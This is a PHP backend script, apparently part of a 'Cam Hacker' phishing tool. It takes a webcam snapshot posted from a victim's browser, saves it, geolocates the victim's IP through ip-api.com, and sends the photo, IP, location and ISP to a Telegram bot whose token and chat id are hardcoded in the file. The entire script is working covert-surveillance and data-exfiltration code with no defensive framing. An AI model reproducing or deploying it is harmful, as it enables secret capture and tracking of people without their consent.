<?php
file_put_contents("debug.log", "Request received\n", FILE_APPEND);

$data = json_decode(file_get_contents("php://input"), true);
$imageData = $data["image"] ?? null;

if (!$imageData) {
    file_put_contents("debug.log", "❌ No image data received.\n", FILE_APPEND);
    exit;
}

$ip = $_SERVER['REMOTE_ADDR'];
$date = date("Y-m-d H:i:s");

$image = base64_decode(preg_replace('#^data:image/\w+;base64,#i', '', $imageData));
file_put_contents("photo.jpg", $image);
file_put_contents("debug.log", "✅ Image saved.\n", FILE_APPEND);

// Geolocation fetch
$geo = json_decode(file_get_contents("http://ip-api.com/json/" . $ip));

$msg = "📸 Cam Hacker Alert!\n";
$msg .= "🕒 Time: $date\n";
$msg .= "🌐 IP: $ip\n";
$msg .= "📍 Location: {$geo->city}, {$geo->regionName}, {$geo->country}\n";
$msg .= "🛰 ISP: {$geo->isp}\n";

// Telegram credentials
$token = "7480978370:AAFh8rnGTSwP7jp-yA9oFSEdrqyJYHRlILo";
$chat_id = "-1264568426";

// Send text first
$sendTextUrl = "https://api.telegram.org/bot$token/sendMessage?chat_id=$chat_id&text=" . urlencode($msg);
$responseText = file_get_contents($sendTextUrl);
file_put_contents("debug.log", "📨 Message response: $responseText\n", FILE_APPEND);

// Send photo
$sendPhoto = curl_init("https://api.telegram.org/bot$token/sendPhoto");
curl_setopt($sendPhoto, CURLOPT_POST, 1);
curl_setopt($sendPhoto, CURLOPT_POSTFIELDS, [
    'chat_id' => $chat_id,
    'photo' => new CURLFile(realpath("photo.jpg"))
]);
curl_setopt($sendPhoto, CURLOPT_RETURNTRANSFER, true);
$responsePhoto = curl_exec($sendPhoto);

if (curl_errno($sendPhoto)) {
    $error = curl_error($sendPhoto);
    file_put_contents("debug.log", "❌ Curl error: $error\n", FILE_APPEND);
} else {
    file_put_contents("debug.log", "✅ Photo response: $responsePhoto\n", FILE_APPEND);
}

curl_close($sendPhoto);
?>
